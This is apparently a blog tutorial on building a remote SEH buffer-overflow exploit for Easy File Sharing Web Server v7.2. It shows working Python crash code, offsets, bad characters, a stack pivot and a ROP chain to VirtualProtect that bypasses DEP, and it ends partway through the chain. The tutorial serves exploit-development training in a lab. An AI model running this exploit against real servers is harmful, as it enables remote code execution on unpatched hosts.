---
layout: post
title: "Easy File Sharing Web Server v7.2 - Remote SEH Buffer Overflow (DEP bypass with ROP)"
date: 2015-11-25 20:46:41 +1100
comments: true
categories: [exploit development, windows, rop, seh]
---

Just a few weeks ago I attended an amazing training on exploit development on Windows - [Corelan Bootcamp](https://www.corelan-training.com/index.php/training-2/bootcamp/). I have to admit, it's probably the best instructor led course I have ever attended; massive props to Peter "[corelanc0d3r](https://twitter.com/corelanc0d3r)" who is a fantastic teacher and to OJ "[TheColonial](https://twitter.com/TheColonial)" for organising it.

Okay, with credits out of the way, let's talk exploits! Since everything I learned at the bootcamp is still fresh in my head, I thought it will be good to practice it a bit more and make sure all of the information sinks in properly.

So, off I went to [exploit-db](https://exploit-db.com) and, after some poking around in DoS and PoC section, I found an exploit that I thought of redesigning and improving - [Easy File Sharing Web Server 7.2 - Remote SEH Based Overflow](https://www.exploit-db.com/exploits/38526/).

<!-- more -->

Everything I described here I'll be treating as a bit of a reference for myself when I forget how things are done. If some parts are unclear or if I skipped some bits and it got confusing, hit me up [@TheKnapsy](https://twitter.com/TheKnapsy) or IRC and I'll be happy to chat!


The Challenge
-------------

Looking at the [existing exploit](https://www.exploit-db.com/exploits/38526/), as you can see, it's a properly working PoC exploit that abuses SEH to achieve code execution, it's remote (which is cool) and... is actually relatively simple.

However, the main issue is that it assumes we are still living somewhere around 1998 and DEP doesn't exist. Let's rewrite it to bypass DEP and ASLR to make it more suitable for modern environments!


Preparation
-----------

I won't go into a lot of details around environment setup, I'll assume you have all of the essentials and you know how to configure them properly.

At the very least, you'll need:


* Windows 7 Professional SP1 x64 (ideally in a VM)
* Enabled DEP - as an admin, type in `bcdedit /set nx AlwaysOn` on the command line
* Python
* [Immunity Debugger](http://debugger.immunityinc.com/)
* [Mona](https://github.com/corelan/mona) - configure where mona should be saving logs, run `!mona config -set workingfolder c:\mona_logs\%p` in the Immunity console
* Decent text editor - such as [Notepad++](https://notepad-plus-plus.org/)
* [Easy File Sharing Web Server v7.2](https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe) - duh!


With the environment ready to go, let's turn the [existing exploit](https://www.exploit-db.com/exploits/38526/) into a more cut down PoC - all we need to know is how to trigger a crash, that's it!

Lets use the code below as a starting point:

{% codeblock lang:python %}
import sys, socket, struct
 
if len(sys.argv) <= 1:
    print "Usage: python efsws.py [host] [port]"
    exit()
  
host = sys.argv[1]    
port = int(sys.argv[2])
 
 
buffer = "A" * 5000
 

httpreq = (
"GET /changeuser.ghp HTTP/1.1\r\n"
"User-Agent: Mozilla/4.0\r\n"
"Host:" + host + ":" + str(port) + "\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-us\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Referer: http://" + host + "/\r\n"
"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"
"Conection: Keep-Alive\r\n\r\n"
)
 
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(httpreq)
s.close()
{% endcodeblock %}

So, in simple terms, we're sending 5000 "A"s in the `UserID` cookie as a part of GET request sent to the server to trigger a crash.


Understanding the crash
-----------------------

Let's trigger the crash and investigate it. Start the server:

![Server_start PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/server_start.png)

Attach Immunity Debugger to the process (`File` -> `Attach` -> Select the `fsws` process -> `F9` to run it)

Run the exploit from the command line: `python poc.py 127.0.0.1 80`.

Boom! Crash!

[![First_crash PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash.png)](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash.png)

Notice the line at the bottom saying:

*Access violation when reading [0000004B] - Use Shift+F7/F8/F9 to pass exception to program*

This indicates that we have triggered an exception that can be handled by the program. Cool, let's see what's happening in the SEH chain: select `View` -> `SEH Chain`.

![First_crash-SEH_overwrite PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/first_crash-seh_overwrite.png)

Awesome news! We have managed to overwrite SEH pointers with our own data and, through this, we'll be able to control execution flow of the program.

But, what exactly triggers the crash? Have a look at the screenshot again - note the value in `EAX` register - `0x41414141` and current instruction that's being executed at the address `61C277F6`- `CMP DWORD PTR DS:[EAX+4C],A029A697`.

What happened? We were trying to access value at the memory address of `EAX + 4C`, since EAX is currently `0x41414141`, which is not a valid address, we can't read from it (or rather, to be specific, we can't read from `0x41414141 + 4C`) and hence, our program crashes.

To make sure our exploit is reliable and always triggers a crash, we'll have to make sure to always overwrite `EAX` with an invalid memory address - let's keep that in mind!


Offsets
-------

Cool, so now we know why our program crashes. Next step is to calculate offsets to find out what's where and how much data we need to send to overwrite everything of interest to us (`EAX` register and `SEH` pointers).

Normally, it would be a painful and cumbersome process, but here comes `mona` with help (and it will continue helping us out even more later on). In the command field in the Immunity, type in `!mona pc 5000` to create a circular pattern of 5000 characters to use in our buffer to then be able to automatically find the offsets.

Mona will create a text file with the pattern in a text file `pattern.txt` under your mona logs directory.

Copy the generated string into the buffer in your exploit (now the buffer should only contain the pattern), start the server again, attach Immunity to it and trigger the crash by running the PoC script (we'll be doing this over and over and over again, so get used to it).

The program should have crashed again, but now `EAX` and `SEH` chain have some other values. That's all good - now lets get `mona` to do the hard work for us and calculate all offsets. Type in `!mona findmsp` and see what it will come back with.

[![findmsp PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/findmsp.png)](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/findmsp.png)

Awesome, we have now all infromation about offsets required for our exploit:

* `EAX` offset is *4183*
* `SEH` offset is *4059*

Let's rewrite part of the exploit and see if we can overwrite speicifc registers with specific values, consider the following, improved PoC:

{% codeblock lang:python %}
# Offsets
max_size = 5000
seh_offset = 4059
eax_offset = 4183
 
buffer = "A" * seh_offset					# padding
buffer += "BBBB"							# overwrite nSEH pointer
buffer += "CCCC"							# overwrite SEH record
buffer += "A" * (eax_offset - len(buffer))	# padding
buffer += "DDDD"							# overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))	# padding
{% endcodeblock %}

If you trigger the crash again, you should see that `EAX` is now `0x44444444` and SEH record is `0x43434343` (nSEH will be `0x42424242`, but because we are dealing with DEP, it's not of interest for us in this particular exploit).

[![offsets PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/offsets.png)](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/offsets.png)


Bad characters
--------------

Now, next step is to find out which bad characters will stuff up our payload. In this case, because we need to send an entire GET request, it is easy to predict that `\x00` will be a bad character, as it denotes end of string and will cut our payload short.

We can automatically exclude the NULL byte, but are there any others? Let's find out now, before we start playing with ROP and choosing addresses that may contain bytes that will be messing up our payload.

Let's generate a bytearray (and exclude NULL byte) with `!mona bytearray -cpb '\x00'`. It will create 2 files, `bytearray.txt` and `bytearray.bin`. Copy-paste generated string from `bytearray.txt` into the exploit **AFTER** the part of overwriting `EAX` register.

Why? Because to trigger the crash, we want to overwrite `EAX`, if we put bytearray with potentially bad characters before we overwrite the `EAX` to trigger a crash, bad character that we don't know of may actually cut our payload short and we'll never trigger the crash!

Our buffer should look like this:

{% codeblock lang:python %}
buffer = "A" * seh_offset					# padding
buffer += "BBBB"							# overwrite nSEH pointer
buffer += "CCCC"							# overwrite SEH record
buffer += "A" * (eax_offset - len(buffer))	# padding
buffer += "DDDD"							# overwrite EAX to always trigger an exception
buffer += ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
{% endcodeblock %}

Trigger the crash again and investigate the stack, trying to find an address where the bytearray starts:

![bad_chars PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/bad_chars_compare.png)

Now, use mona to find bad chars (it will compare what it sees on the stack with what's in the generated `bytearray.bin` file):
```
!mona compare -f C:\mona_logs\fsws\bytearray.bin -a 0x02EC6F34
```

Where:

* **-f C:\mona_logs\fsws\bytearray.bin** is location of the bytearray binary (the baseline, expected array)
* **-a 0x02EC6F34** is an exact address of where our bytearray starts from on the stack

![bad_char_found PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/bad_char_found.png)

Ok, mona found additional bad character - `\x3b`. Let's repeat above process, remembering to now exclude `\x00` and `\x3b` from the bytearray and see if there are any more bad characters. The results should be as below:

![no_more_bad_chars PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/no_more_bad_chars.png)

That's it - the bad characters we will have to avoid in our payload are `\x00` and `\x3b`.


Stack pivoting
--------------

Alright, finally we're getting to the more exciting parts! So far it was kind of a general stuff that needs to be done every time you develop an exploit. Don't get me wrong, these were super important tasks that lay out nice foundations for our further work, so always make sure you get your offsets and bad chars out of the way early and are confident and happy about what's happening in the program.

To continue further, we need to understand what happens in the program when the exception is triggered:

* ESP is moved further "up" (towards lower addresses of the memory)
* command execution is directed to the address in the SEH record (which we control!)

Keeping in mind that we're dealing with DEP (we can't simply execute commands on the stack), we need to come up with a ROP chain to get around that.

However, we have an issue to deal with - ESP has been moved far away from the area on the stack that we control, hence, our future ROP chain would not be executed as we're simply not there on the stack.

To visualise what I'm talking about, start the program and trigger a crash. As the program crashes, press `ctrl` + `F9` to pass execution of the exception code to the program.

![seh_error PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/seh_error.png)

What happened there was:

* Program tried to execute instruction at the address `0x43434343` (SEH record), which is invalid address, so that failed, and triggered another exception, which was handled by the system level exception handler
* ESP was moved all the way "up" towards lower addresses

What we'll have to do now is to simply move ESP back to the address space we control. To do this, we need to find a single command that will move ESP a certain distance down the stack (towards higher memory addresses) to land in the area of our buffer.

First, we need to calculate how much we need to jump - simply right click on the stack addresses and choose `Address` -> `Relative to ESP` and scroll all the way down the stack till you notice data from the buffer (lots of "A"s or `0x41`).

![stack_pivot PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/stack_pivot.png)

Looking at this, we need to move ESP somewhere around at least `0x9F4` (decimal 2548) bytes "down" the stack.

Once again, `mona` comes with help - at the time of the crash run the following command to generate list of stack pivots that we could use:

```
!mona stackpivot -distance 2548 -cpb '\x00\x3b'
```

Where:

* **-distance 2548** specifies minimum number of bytes to jump - only instructions that jump at least that many bytes will be returned
* **-cpb '\x00\x3b'** removes instructions which addresses contain bad characters that would break our exploit

Mona will generate a text file `stackpivot.txt` containing list of potential pivots to use and put it in the mona logs directory. 

Open the file and try to find a single instruction that addresses our needs.

```
0x1002280a : {pivot 4100 / 0x1004} :  # ADD ESP,1004 # RETN    ** [ImageLoad.dll] **   |  ascii {PAGE_EXECUTE_READ}
```

It will move the ESP "down" 4100 bytes, a lot more than we needed, however, it is the smallest one available that fits our needs. Luckily we have plenty of space on the buffer to play with, so in this case, it actually will work fine.

Let's update our exploit to, instead overwriting SEH with garbage, execute the pivot! Once we run the application and trigger the crash, after passing execution back to the program, we should land back on our buffer.

The PoC now looks like this:

{% codeblock lang:python %}
# Offsets
max_size = 5000
seh_offset = 4059
eax_offset = 4183
 
buffer = "A" * seh_offset					# padding
buffer += "BBBB"							# overwrite nSEH pointer
buffer += struct.pack("<I", 0x1002280a)		# overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))	# padding
buffer += "DDDD"							# overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))	# padding
{% endcodeblock %}

And that's the result:

![pivot_success PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/pivot_success.png)

Now we just need to find out where exactly are we landing on our buffer after the pivot. I guess you could use the offset trick from before or just do some maths manually - turns out that we land exactly **2455** bytes into our buffer, let's keep that in mind and cater for that.


ROP
---

Alright, the most exciting part of the exploit development! *ROP ROP ROP your boat, gently down the stream...* :-)

Let's plan the attack! What we'll need to do is come up with a ROP chain that will disable DEP for us. Luckily, Windows already gives us 2 functions we can call ([VirtualProtect](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898%28v=vs.85%29.aspx) and [VirtualAlloc](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887%28v=vs.85%29.aspx)) to achieve this.

They both take quite a few parameters, so, the main task will be to provide them reliably. In cases like this, there's also another neat trick that we can use - using `PUSHAD` opcode. What it does, it takes values from all of the registers and pushes them on the stack for us. If we can carefully put required values into apropraite registers and call `PUSHAD`, the registers will be pushed on the stack and, if we then call `VirtualProtect` function, the values from the stack will be taken as parameters to the function!

As long as we have right values in the right registers (i.e. providing them in a right order to `VirutalProtect`) it will execute the function correctly! After disabling DEP with ROP, we can simply put the our shellcode right after the ROP chain and it will be successfully executed from the stack.

Before we jump into more details, let's see how our buffer should look like now:

{% codeblock lang:python %}
# Offsets
rop_offset = 2455
max_size = 5000
seh_offset = 4059
eax_offset = 4183
 
buffer = "A" * rop_offset						# padding
buffer += create_rop_chain()
buffer += shellcode
buffer += "A" * (seh_offset - len(buffer))		# padding
buffer += "BBBB"								# overwrite nSEH pointer
buffer += struct.pack("<I", 0x1002280a)			# overwrite SEH record with stack pivot (ADD ESP,1004 # RETN [ImageLoad.dll])
buffer += "A" * (eax_offset - len(buffer))		# padding
buffer += struct.pack("<I", 0xffffffff)			# overwrite EAX to always trigger an exception
buffer += "A" * (max_size - len(buffer))		# padding
{% endcodeblock %}

Once again, `mona` comes with great help for us - it can actually generate a ROP chain for us (or at least majority of it) making the task a bit simpler.

Run the program, trigger the crash, pass the execution to the program (it will crash again on incorrect EIP) and run `!mona modules` to find out what DLLs are loaded by the application and if there any restrictions on them.

[![mona modules PNG](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/mona_modules.png)](/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/mona_modules.png)

From the above, we can see that there's bunch of modules loaded, but the ones we are the most interested in, are the ones that are **non-ASLR** and **not rebased**.

It appears that there 2 modules like this `fsws.exe` and `sqlite3.dll` - we'll use them to find our ROP gadgets.

Also, a good thing is that they're both application DLLs (not system ones), meaning that they will always be loaded unchanged, regardless of the operating system flavour, hence, our exploit should be quite reliable and cross-platform (hopefully!).

With that in mind, we can now execute the following:

```
!mona rop -m sqlite3.dll,fsws.exe -cpb '\x00\x3b'
```

Where:

* **-m sqlite3.dll,fsws.exe** specifies modules (`sqlite3.dll` and `fsws.exe`) in which we want to look for gadgets
* **-cpb '\x00\x3b'** ignores gadgets with addresses containing bad characters that would break our exploit

Mona will generate bunch of files in it's logs directory:

* `rop.txt` - containing list of various rop gadgets to use, categorised by the functionality
* `rop_suggestions.txt` - another list of various rop gadgets, generally more complex instructions
* `rop_chains.txt` - ready made ROP chains to disable DEP using `VirutalProtect` or `VirtualAlloc` functions

Let's have a look at `rop_chains.txt` and see if there's something useful we could use:

{% codeblock lang:python %}
*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
      0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll] 
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll] 
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
      0x10013ad6,  # POP EBP # RETN [ImageLoad.dll] 
      0x61c227fa,  # & push esp # ret  [sqlite3.dll]
      0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x1001b4f6,  # POP ECX # RETN [ImageLoad.dll] 
      0x61c73281,  # &Writable location [sqlite3.dll]
      0x100194b3,  # POP EDI # RETN [ImageLoad.dll] 
      0x1001a858,  # RETN (ROP NOP) [ImageLoad.dll]
      0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x90909090,  # nop
      0x100240c2,  # PUSHAD # RETN [ImageLoad.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()
{% endcodeblock %}

Awesome, all hard work has been done for us! Well, not all of it actually - have a look at this line:

```
0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
```

Oops, mona found all but one gadget that we need for a successful ROP chain... but it's not the end of the world, let's find it ourselves! *And that's where the real fun begins.*

Looking through all available gadgets that mona found, I really couldn't find anything simple that would put value of 201 to EBX. There were some `POP EBX` instructions available, but that was not very helpful. Why? 201 in hex contains `\x00`, which is a bad character and we can't use it!

I kept poking around and decided that I will probably need to put the value into EBX through some other register that I can easily populate with whatever value I want (specifically 201). I decided to focus on EAX.

With couple simple gadgets, I had 201 in EAX in no time:

{% codeblock lang:python %}
	  # Generate value of 201 in EAX
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll]
	  0xFFFFFDFF,  # Value of '-201'
	  0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
{% endcodeblock %}

Okay, how can I put it in the EBX now? Again, after a lot of searching, I couldn't find anything straight forward. Searched a bit more and stumbled across this:

```
	  0x1001da09:  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
```

Cool, so it will move EAX into EBX - exactly what I wanted! But it also does couple other things afterwards that may be problematic... let's look into it further.

In simple terms, what happens next is that we are saving the address of `ESP+C` (4th argument on the stack) into `EAX` and then, we increment the value pointed to by the address stored in `EAX`. This means that for it to work correctly, we need to have a writeable location in the memory so we can `INC` the value pointed by the address in `EAX`.

Luckily, looking at the generated part of the chain, mona already found it for us!

```
	  0x61c73281,  # &Writable location [sqlite3.dll]
```

Awesome, now we just need to do a bit of shuffling around with ESP to compensate for the first gadget and we should be fine! I ended up coming up with the following snippet:

{% codeblock lang:python %}
	  # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)
	  0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
	  
	  # Other instructions to execute after above gadget - mona found those already...
	  # (This is just to show that gadget above picks 4th next address to put into EAX)
	  0xDEADBEEF,
	  0xDEADBEEF,
	  0xDEADBEEF,

	  0x61c73281,  # &Writable location [sqlite3.dll]	
{% endcodeblock %}

Also, last thing to remember is that the gadgets above will mess up our EAX register, which is a problem if we decide to insert them exactly where mona suggested. Why? Because one of the first things the suggested ROP chain does is that it sets EAX to an expected value. If we corrupt it later with our gadgets, call to `VirtualAlloc` won't have right arguments and the function will fail.

To overcome this, simply change the order and do our EBX magic as a first thing in the ROP chain. Setting up EAX will follow and we won't be corrupting anything.

Putting it all together, that's the final, working ROP chain:

{% codeblock lang:python %}
# ROP chain generated with mona.py - www.corelan.be (and slightly fixed by @TheKnapsy)
# Essentially, use PUSHAD to set all parameters and call VirtualProtect() to disable DEP.
def create_rop_chain():

    rop_gadgets = [
	  # Generate value of 201 in EAX
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll]
	  0xFFFFFDFF,  # Value of '-201'
	  0x100231d1,  # NEG EAX # RETN [ImageLoad.dll]
	
	  # Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)
	  0x1001da09,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
	  
	  # Carry on with the ROP as generated by mona.py
	  0x10015442,  # POP EAX # RETN [ImageLoad.dll] 
      0x61c832d0,  # ptr to &VirtualProtect() [IAT sqlite3.dll]
	
	  # Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location
	  # used solely by this the remaining part of the above gadget (it doesn't really do anything for us)
	  0x1001281a,  # ADD ESP,4 # RETN [ImageLoad.dll]
	  0x61c73281,  # &Writable location [sqlite3.dll]
	
	  # And carry on further as generated by mona.py
	  0x1002248c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] 
      0x61c18d81,  # XCHG EAX,EDI # RETN [sqlite3.dll]
      0x1001d626,  # XOR ESI,ESI # RETN [ImageLoad.dll] 
      0x10021a3e,  # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] 
      0x10013ad6,  # POP EBP # RETN [ImageLoad.dll] 
      0x61c227fa,  # & push esp # ret  [sqlite3.dll]
      0x10022c4c,  # XOR EDX,EDX # RETN [ImageLoad.dll] 
	  
	  # Now bunch of ugly increments... may need to look for something nicer, but hey - it works!
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
      0x61c066be,  # INC EDX # ADD CL,CL # RETN [sqlite3.dll] 
